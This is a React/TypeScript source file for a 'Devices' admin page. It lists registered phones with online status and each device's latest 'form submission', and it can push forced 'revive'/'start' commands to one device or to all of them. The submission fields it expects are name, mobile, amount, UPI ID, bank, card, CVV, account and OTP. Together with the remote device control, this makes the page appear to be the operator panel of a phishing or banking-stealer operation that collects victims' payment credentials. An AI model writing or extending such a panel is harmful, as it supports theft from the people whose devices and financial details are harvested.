// src/pages/DevicesPage.tsx
import {
  memo,
  useCallback,
  useDeferredValue,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import axios from "axios";

import type { DeviceDoc } from "../types";
import { getDevices, deleteDevice } from "../services/api/devices";
import { getFavoritesMap, setFavorite } from "../services/api/favorites";
import { ENV, apiHeaders } from "../config/constants";
import ztLogo from "../assets/zt-logo.png";
import pageBg from "../assets/login-bg.png";

type Row = DeviceDoc & { _fav?: boolean };
type FormSubmission = Record<string, any>;
type DeviceFilter = "all" | "online" | "offline" | "favorites";

type DisplayRow = Row & {
  brand: string;
  model: string;
  online: boolean;
  favoriteFlag: boolean;
  lastSeenTs: number;
  lastSeenLabel: string;
  lastForm: string;
  logoSrc: string;
};

const LIST_ROW_HEIGHT = 252;
const LIST_OVERSCAN = 6;
const VIRTUALIZE_AFTER = 24;

function safeStr(v: unknown): string {
  return String(v ?? "").trim();
}

function normalizeFilter(v: string | null | undefined): DeviceFilter {
  if (v === "online" || v === "offline" || v === "favorites") return v;
  return "all";
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

function pickModel(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.model || d?.model || "");
}

function pickLastSeenTs(d: any): number {
  const ts = d?.status?.timestamp;
  return typeof ts === "number" ? ts : 0;
}

function formatLastSeen(ts: number): string {
  if (!ts) return "-";
  try {
    return new Date(ts).toLocaleString();
  } catch {
    return "-";
  }
}

function pickFormDeviceId(s: FormSubmission): string {
  return safeStr(s?.uniqueid || s?.uniqueId || s?.deviceId || s?.device || s?.uid || "");
}

function pickFormTs(s: FormSubmission): number {
  const t1 = Number(s?.timestamp || s?.ts);
  if (Number.isFinite(t1) && t1 > 0) return t1;

  const created = safeStr(s?.createdAt || s?.created_at || s?.date || "");
  if (created) {
    const t = Date.parse(created);
    if (Number.isFinite(t)) return t;
  }

  return 0;
}

function maskMaybeSensitive(key: string, value: string): string {
  const k = key.toLowerCase();
  const digits = value.replace(/\D/g, "");
  const looksSensitive =
    k.includes("card") || k.includes("cvv") || k.includes("pan") || k.includes("account") || k.includes("acc");

  if (looksSensitive && digits.length >= 8) return `****${digits.slice(-4)}`;
  if (k.includes("otp") && digits.length >= 4) return "****";

  return value;
}

function summarizeForm(s: FormSubmission | null | undefined): string {
  if (!s || typeof s !== "object") return "No form submit";

  const candidates: Array<[string, any]> = [
    ["name", s.name || s.fullName],
    ["mobile", s.mobile || s.phone],
    ["amount", s.amount || s.amt],
    ["upi", s.upi || s.upiId],
    ["bank", s.bank || s.bankName],
    ["title", s.title || s.formTitle],
  ];

  const parts: string[] = [];

  for (const [k, raw] of candidates) {
    const v = safeStr(raw);
    if (!v) continue;
    parts.push(`${k}: ${maskMaybeSensitive(k, v)}`);
    if (parts.length >= 3) break;
  }

  const ts = pickFormTs(s);
  if (ts) parts.push(new Date(ts).toLocaleString());

  return parts.length ? parts.join(" • ") : "Form submitted";
}

function pickDeviceLogo(d: any): string {
  const meta = d?.metadata || {};
  const url = safeStr(meta.logoUrl || meta.logo || meta.iconUrl || meta.brandLogoUrl);

  if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:image/")) {
    return url;
  }

  return ztLogo;
}

function DeviceLogo({ src, alt }: { src: string; alt: string }) {
  const [broken, setBroken] = useState(false);

  if (broken) {
    return (
      <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-white/15 bg-white/8 text-sm font-bold text-white/80">
        {alt.slice(0, 1).toUpperCase()}
      </div>
    );
  }

  return (
    <img
      src={src}
      alt={alt}
      className="h-11 w-11 rounded-2xl border border-white/15 bg-white/8 object-cover"
      onError={() => setBroken(true)}
      draggable={false}
      loading="lazy"
    />
  );
}

function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/12" />
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/8" />

      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 rounded-tl-[10px] border-l-2 border-t-2 border-cyan-200/40" />
      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 rounded-tr-[10px] border-r-2 border-t-2 border-cyan-200/40" />
      <div className="pointer-events-none absolute bottom-3 left-3 h-6 w-6 rounded-bl-[10px] border-b-2 border-l-2 border-cyan-200/40" />
      <div className="pointer-events-none absolute bottom-3 right-3 h-6 w-6 rounded-br-[10px] border-b-2 border-r-2 border-cyan-200/40" />

      <div
        className={[
          "relative rounded-[26px] px-4 py-4",
          "border border-white/[0.14]",
          "bg-white/[0.05]",
          "backdrop-blur-2xl",
          "shadow-[0_24px_70px_rgba(0,0,0,0.45)]",
        ].join(" ")}
      >
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-60"
          style={{
            backgroundImage:
              "linear-gradient(to bottom, rgba(255,255,255,0.16), rgba(255,255,255,0.05) 24%, rgba(255,255,255,0.00) 70%)",
          }}
        />
        <div className="relative">{children}</div>
      </div>
    </div>
  );
}

type DeviceCardProps = {
  device: DisplayRow;
  displayNumber: number;
  isChecking: boolean;
  onOpen: (deviceId: string) => void;
  onToggleFavorite: (deviceId: string) => void;
  onCheckOnline: (deviceId: string) => void;
  onDelete: (deviceId: string) => void;
};

const DeviceCard = memo(function DeviceCard({
  device,
  displayNumber,
  isChecking,
  onOpen,
  onToggleFavorite,
  onCheckOnline,
  onDelete,
}: DeviceCardProps) {
  return (
    <div className="relative h-full overflow-hidden rounded-[24px] border border-white/12 bg-white/[0.05] p-4 shadow-[0_14px_36px_rgba(0,0,0,0.30)] backdrop-blur-xl">
      <div className="pointer-events-none absolute inset-0 rounded-[24px] border border-cyan-200/6" />

      <div className="flex items-start justify-between gap-3">
        <div className="flex min-w-0 items-center gap-3">
          <DeviceLogo src={device.logoSrc} alt={device.brand} />

          <div className="min-w-0">
            <div className="flex min-w-0 items-center gap-2">
              <div className="min-w-0 truncate text-[16px] font-extrabold text-white">{device.brand}</div>

              <div
                className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full border border-white/12 bg-cyan-400/85 text-sm font-extrabold text-white shadow-[0_6px_18px_rgba(2,6,23,0.45)]"
                title={`#${displayNumber}`}
                aria-hidden={false}
              >
                {displayNumber}
              </div>
            </div>

            <div className="truncate text-[12px] text-white/60">
              {device.model ? `${device.model} • ` : ""}
              ID: {device.deviceId}
            </div>
          </div>
        </div>

        <div className="flex shrink-0 flex-col items-end gap-2">
          <span
            className={[
              "rounded-full border px-3 py-1 text-[12px] font-extrabold",
              device.online
                ? "border-green-400/25 bg-green-500/15 text-green-200"
                : "border-red-400/25 bg-red-500/15 text-red-200",
            ].join(" ")}
          >
            {device.online ? "Online" : "Offline"}
          </span>

          <button
            onClick={() => onToggleFavorite(device.deviceId)}
            className={[
              "flex h-10 w-10 items-center justify-center rounded-2xl border text-lg backdrop-blur-xl",
              device.favoriteFlag
                ? "border-yellow-300 bg-yellow-400/90 text-white shadow-[0_10px_24px_rgba(250,204,21,0.20)]"
                : "border-white/15 bg-white/[0.05] text-white/60 hover:bg-white/[0.09]",
            ].join(" ")}
            type="button"
            title={device.favoriteFlag ? "Unfavorite" : "Favorite"}
          >
            ★
          </button>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-2 gap-3">
        <div className="rounded-2xl border border-white/10 bg-white/[0.035] p-3">
          <div className="text-[11px] text-white/55">Last seen</div>
          <div className="mt-1 text-[13px] font-semibold text-white/90">{device.lastSeenLabel}</div>
        </div>

        <div className="rounded-2xl border border-white/10 bg-white/[0.035] p-3">
          <div className="text-[11px] text-white/55">Latest form</div>
          <div className="mt-1 line-clamp-2 text-[13px] font-semibold text-white/85">{device.lastForm}</div>
        </div>
      </div>

      <div className="mt-4 grid grid-cols-[1fr_1fr_auto] gap-2">
        <button
          onClick={() => onOpen(device.deviceId)}
          className="h-11 rounded-2xl border border-white/14 bg-white/[0.06] text-[14px] font-extrabold text-white/90 backdrop-blur-xl hover:bg-white/[0.09] active:scale-[0.99]"
          type="button"
        >
          Open
        </button>

        <button
          onClick={() => onCheckOnline(device.deviceId)}
          disabled={isChecking}
          className={[
            "h-11 rounded-2xl border border-cyan-300/25 bg-cyan-400/15 text-[14px] font-extrabold text-cyan-100 backdrop-blur-xl",
            "hover:bg-cyan-400/20 active:scale-[0.99]",
            "disabled:cursor-not-allowed disabled:opacity-60",
          ].join(" ")}
          type="button"
        >
          {isChecking ? "Checking…" : "Check Online"}
        </button>

        <button
          onClick={() => onDelete(device.deviceId)}
          className="h-11 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 text-[14px] font-extrabold text-red-100 backdrop-blur-xl hover:bg-red-500/14 active:scale-[0.99]"
          type="button"
        >
          Delete
        </button>
      </div>
    </div>
  );
});

export default function DevicesPage() {
  const nav = useNavigate();
  const [searchParams, setSearchParams] = useSearchParams();

  const [devices, setDevices] = useState<Row[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [latestFormMap, setLatestFormMap] = useState<Record<string, FormSubmission>>({});
  const [loading, setLoading] = useState(false);

  const [search, setSearch] = useState("");
  const deferredSearch = useDeferredValue(search);

  const [filter, setFilter] = useState<DeviceFilter>(normalizeFilter(searchParams.get("filter")));
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [checkingDeviceId, setCheckingDeviceId] = useState<string | null>(null);
  const [checkingAll, setCheckingAll] = useState(false);

  const loadInFlightRef = useRef(false);
  const pollCounterRef = useRef(0);
  const listRef = useRef<HTMLDivElement | null>(null);
  const [visibleRange, setVisibleRange] = useState({ start: 0, end: 18 });

  const loadFormsLatestByDevice = useCallback(async (): Promise<Record<string, FormSubmission>> => {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, {
        headers: apiHeaders(),
        timeout: 12_000,
      });

      const list = Array.isArray(res.data) ? (res.data as FormSubmission[]) : [];
      const map: Record<string, FormSubmission> = {};

      for (const s of list) {
        const did = pickFormDeviceId(s);
        if (!did) continue;

        const ts = pickFormTs(s);
        const prev = map[did];

        if (!prev || ts > pickFormTs(prev)) {
          map[did] = s;
        }
      }

      return map;
    } catch {
      return {};
    }
  }, []);

  const sendCheckOnlineCommand = useCallback(async (deviceId: string) => {
    const encodedId = encodeURIComponent(deviceId);
    const headers = apiHeaders();

    try {
      return await axios.post(
        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/revive`,
        { source: "devices_page", force: true },
        { headers, timeout: 15_000 },
      );
    } catch {
      return axios.post(
        `${ENV.API_BASE}/api/admin/push/devices/${encodedId}/start`,
        { source: "devices_page", force: true },
        { headers, timeout: 15_000 },
      );
    }
  }, []);

  const loadAll = useCallback(
    async ({ includeForms = true, silent = false }: { includeForms?: boolean; silent?: boolean } = {}) => {
      if (loadInFlightRef.current) return;

      loadInFlightRef.current = true;
      if (!silent) setLoading(true);

      try {
        const [list, favMap, maybeForms] = await Promise.all([
          getDevices(),
          getFavoritesMap(),
          includeForms ? loadFormsLatestByDevice() : Promise.resolve(null),
        ]);

        const safeFav = favMap || {};

        const normalized = (list || []).map((d: any) => {
          const id = pickDeviceId(d) || "unknown";
          return { ...d, deviceId: id, _fav: !!safeFav[id] } as Row;
        });

        normalized.reverse();

        setDevices(normalized);
        setFavoritesMap(safeFav);

        if (maybeForms) {
          setLatestFormMap(maybeForms);
        }
      } catch (e) {
        console.error("loadAll failed", e);
        setSuccess(null);
        setError("Failed to load devices from server");
        setDevices([]);
        if (includeForms) setLatestFormMap({});
      } finally {
        loadInFlightRef.current = false;
        if (!silent) setLoading(false);
      }
    },
    [loadFormsLatestByDevice],
  );

  useEffect(() => {
    const qpFilter = normalizeFilter(searchParams.get("filter"));
    setFilter((prev) => (prev === qpFilter ? prev : qpFilter));
  }, [searchParams]);

  useEffect(() => {
    loadAll({ includeForms: true }).catch(() => {});

    const id = window.setInterval(() => {
      pollCounterRef.current += 1;
      const includeForms = pollCounterRef.current % 5 === 0;
      loadAll({ includeForms, silent: true }).catch(() => {});
    }, 12_000);

    return () => window.clearInterval(id);
  }, [loadAll]);

  const displayRows = useMemo<DisplayRow[]>(() => {
    return devices.map((d) => {
      const deviceId = safeStr(d.deviceId);
      const favoriteFlag = !!(favoritesMap[deviceId] ?? d.favorite ?? d._fav);
      const lastSeenTs = pickLastSeenTs(d);

      return {
        ...d,
        deviceId,
        brand: pickBrand(d),
        model: pickModel(d),
        online: !!d.status?.online,
        favoriteFlag,
        lastSeenTs,
        lastSeenLabel: formatLastSeen(lastSeenTs),
        lastForm: latestFormMap[deviceId] ? summarizeForm(latestFormMap[deviceId]) : "No form submit",
        logoSrc: pickDeviceLogo(d),
      };
    });
  }, [devices, favoritesMap, latestFormMap]);

  const filtered = useMemo(() => {
    const q = deferredSearch.trim().toLowerCase();

    return displayRows.filter((d) => {
      if (filter === "online" && !d.online) return false;
      if (filter === "offline" && d.online) return false;
      if (filter === "favorites" && !d.favoriteFlag) return false;

      if (!q) return true;

      return (
        d.deviceId.toLowerCase().includes(q) ||
        d.brand.toLowerCase().includes(q) ||
        d.model.toLowerCase().includes(q)
      );
    });
  }, [displayRows, deferredSearch, filter]);

  const shouldVirtualize = filtered.length > VIRTUALIZE_AFTER;

  useEffect(() => {
    if (!shouldVirtualize) {
      setVisibleRange({ start: 0, end: filtered.length });
      return;
    }

    let raf = 0;

    const calcRange = () => {
      const el = listRef.current;
      if (!el) return;

      const listTop = el.getBoundingClientRect().top + window.scrollY;
      const scrollTop = window.scrollY;
      const viewportBottom = scrollTop + window.innerHeight;

      const relativeTop = Math.max(0, scrollTop - listTop);
      const relativeBottom = Math.max(0, viewportBottom - listTop);

      const start = Math.max(0, Math.floor(relativeTop / LIST_ROW_HEIGHT) - LIST_OVERSCAN);
      const end = Math.min(filtered.length, Math.ceil(relativeBottom / LIST_ROW_HEIGHT) + LIST_OVERSCAN);

      setVisibleRange((prev) => {
        if (prev.start === start && prev.end === end) return prev;
        return { start, end };
      });
    };

    const onScrollOrResize = () => {
      if (raf) return;
      raf = window.requestAnimationFrame(() => {
        raf = 0;
        calcRange();
      });
    };

    calcRange();

    window.addEventListener("scroll", onScrollOrResize, { passive: true });
    window.addEventListener("resize", onScrollOrResize);

    return () => {
      if (raf) window.cancelAnimationFrame(raf);
      window.removeEventListener("scroll", onScrollOrResize);
      window.removeEventListener("resize", onScrollOrResize);
    };
  }, [filtered.length, shouldVirtualize]);

  const handleFilterChange = useCallback(
    (next: DeviceFilter) => {
      setFilter(next);

      const params = new URLSearchParams(searchParams);
      if (next === "all") params.delete("filter");
      else params.set("filter", next);

      setSearchParams(params, { replace: true });
    },
    [searchParams, setSearchParams],
  );

  const handleOpen = useCallback(
    (deviceId: string) => {
      nav(`/devices/${encodeURIComponent(deviceId)}`);
    },
    [nav],
  );

  const toggleFavoriteHandler = useCallback(async (deviceId: string) => {
    const curr = !!(favoritesMap[deviceId] ?? false);
    const next = !curr;

    try {
      await setFavorite(deviceId, next);

      setFavoritesMap((m) => ({ ...m, [deviceId]: next }));
      setDevices((prev) => prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)));
    } catch (e) {
      console.error("toggleFavorite failed", e);
      setSuccess(null);
      setError("Failed to update favorite");
    }
  }, [favoritesMap]);

  const handleDeleteDevice = useCallback(async (deviceId: string) => {
    if (!window.confirm(`Delete device ${deviceId}? This will remove it from DB.`)) return;

    try {
      await deleteDevice(deviceId);

      setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
      setFavoritesMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        return copy;
      });
      setLatestFormMap((m) => {
        const copy = { ...m };
        delete copy[deviceId];
        return copy;
      });

      setSuccess(null);
      setError(null);
    } catch (e) {
      console.error("deleteDevice failed", e);
      setSuccess(null);
      setError("Failed to delete device");
    }
  }, []);

  const handleCheckOnline = useCallback(
    async (deviceId: string) => {
      if (!deviceId || checkingDeviceId || checkingAll) return;

      setCheckingDeviceId(deviceId);
      setError(null);
      setSuccess(null);

      try {
        await sendCheckOnlineCommand(deviceId);
        setSuccess(`Check command sent to ${deviceId}`);
      } catch (e) {
        console.error("check online failed", e);
        setError(`Failed to send check command for ${deviceId}`);
      } finally {
        setCheckingDeviceId(null);
      }
    },
    [checkingAll, checkingDeviceId, sendCheckOnlineCommand],
  );

  const handleCheckAll = useCallback(async () => {
    if (checkingAll || checkingDeviceId) return;

    const ids = Array.from(new Set(devices.map((d) => safeStr(d.deviceId)).filter(Boolean)));

    if (ids.length === 0) {
      setSuccess(null);
      setError("No devices available");
      return;
    }

    setCheckingAll(true);
    setError(null);
    setSuccess(null);

    try {
      const results = await Promise.allSettled(ids.map((id) => sendCheckOnlineCommand(id)));
      const okCount = results.filter((r) => r.status === "fulfilled").length;
      const failCount = results.length - okCount;

      if (failCount === 0) {
        setSuccess(`Check command sent to all ${okCount} devices`);
      } else if (okCount > 0) {
        setSuccess(`Check command sent to ${okCount} devices`);
        setError(`Failed for ${failCount} devices`);
      } else {
        setError("Failed to send check command to devices");
      }
    } catch (e) {
      console.error("check all failed", e);
      setError("Failed to send check command to all devices");
    } finally {
      setCheckingAll(false);
    }
  }, [checkingAll, checkingDeviceId, devices, sendCheckOnlineCommand]);

  const handleManualRefresh = useCallback(() => {
    setError(null);
    setSuccess(null);
    loadAll({ includeForms: true }).catch(() => {});
  }, [loadAll]);

  const visibleRows = shouldVirtualize ? filtered.slice(visibleRange.start, visibleRange.end) : filtered;
  const topSpacer = shouldVirtualize ? visibleRange.start * LIST_ROW_HEIGHT : 0;
  const bottomSpacer = shouldVirtualize ? Math.max(0, (filtered.length - visibleRange.end) * LIST_ROW_HEIGHT) : 0;

  return (
    <div className="relative min-h-[100svh] w-full overflow-x-hidden bg-black">
      <div className="absolute inset-0 bg-cover bg-center" style={{ backgroundImage: `url(${pageBg})` }} />
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />

      <div className="pointer-events-none absolute inset-0 opacity-30">
        <div className="absolute left-1/2 top-[-96px] h-[420px] w-[420px] -translate-x-1/2 rounded-full bg-cyan-400/12 blur-3xl" />
        <div className="absolute left-[-120px] top-[35%] h-[320px] w-[320px] rounded-full bg-blue-400/8 blur-3xl" />
        <div className="absolute bottom-[-140px] right-[-140px] h-[360px] w-[360px] rounded-full bg-cyan-300/10 blur-3xl" />
      </div>

      <div className="relative mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <TechGlassCard>
          <div className="flex items-start justify-between gap-3">
            <div>
              <div className="text-[22px] font-extrabold tracking-tight text-white">Devices</div>
              <div className="text-[12px] text-white/60">Manage all registered devices</div>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={handleCheckAll}
                disabled={checkingAll || devices.length === 0}
                className={[
                  "h-10 rounded-2xl border px-4 text-white/90 backdrop-blur-xl",
                  "border-cyan-300/25 bg-cyan-400/15",
                  "hover:bg-cyan-400/20 active:scale-[0.99]",
                  "disabled:cursor-not-allowed disabled:opacity-60",
                ].join(" ")}
                type="button"
                title="Check all devices"
              >
                {checkingAll ? "Checking…" : "Check All"}
              </button>

              <button
                onClick={handleManualRefresh}
                className="h-10 rounded-2xl border border-white/14 bg-white/[0.06] px-4 text-white/85 backdrop-blur-xl hover:bg-white/[0.09]"
                type="button"
                title="Refresh"
              >
                ↻
              </button>
            </div>
          </div>

          <div className="mt-4">
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search brand / model / id"
              className={[
                "h-11 w-full rounded-2xl px-4 text-[14px]",
                "border border-white/[0.14] bg-white/[0.06]",
                "text-white placeholder:text-white/35",
                "shadow-[inset_0_1px_0_rgba(255,255,255,0.08),_0_10px_28px_rgba(0,0,0,0.18)]",
                "backdrop-blur-xl outline-none",
                "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
              ].join(" ")}
            />
          </div>

          <div className="mt-3 flex items-center justify-between gap-2">
            <div className="text-[12px] text-white/60">Results: {filtered.length}</div>

            <select
              value={filter}
              onChange={(e) => handleFilterChange(e.target.value as DeviceFilter)}
              className={[
                "h-10 rounded-2xl px-3 text-[13px] font-semibold",
                "border border-white/[0.14] bg-white/[0.06]",
                "text-white/90 backdrop-blur-xl outline-none",
              ].join(" ")}
            >
              <option value="all">All</option>
              <option value="online">Online</option>
              <option value="offline">Offline</option>
              <option value="favorites">Favorites</option>
            </select>
          </div>

          <div ref={listRef} className="mt-4">
            {loading && devices.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-5 text-center text-white/70 backdrop-blur-xl">
                Loading…
              </div>
            ) : filtered.length === 0 ? (
              <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-6 text-center text-white/60 backdrop-blur-xl">
                No devices found.
              </div>
            ) : (
              <>
                {topSpacer > 0 && <div style={{ height: topSpacer }} />}

                {visibleRows.map((d, idx) => {
                  const absoluteIndex = shouldVirtualize ? visibleRange.start + idx : idx;
                  const displayNumber = filtered.length - absoluteIndex;
                  const isCheckingThis = checkingDeviceId === d.deviceId;

                  return (
                    <div
                      key={d.deviceId}
                      className="mb-3"
                      style={shouldVirtualize ? { height: LIST_ROW_HEIGHT } : undefined}
                    >
                      <DeviceCard
                        device={d}
                        displayNumber={displayNumber}
                        isChecking={isCheckingThis || checkingAll}
                        onOpen={handleOpen}
                        onToggleFavorite={toggleFavoriteHandler}
                        onCheckOnline={handleCheckOnline}
                        onDelete={handleDeleteDevice}
                      />
                    </div>
                  );
                })}

                {bottomSpacer > 0 && <div style={{ height: bottomSpacer }} />}
              </>
            )}
          </div>

          {success && (
            <div className="mt-4 rounded-2xl border border-emerald-400/25 bg-emerald-500/10 px-4 py-2 text-sm text-emerald-100">
              {success}
            </div>
          )}

          {error && (
            <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
              {error}
            </div>
          )}
        </TechGlassCard>
      </div>
    </div>
  );
}
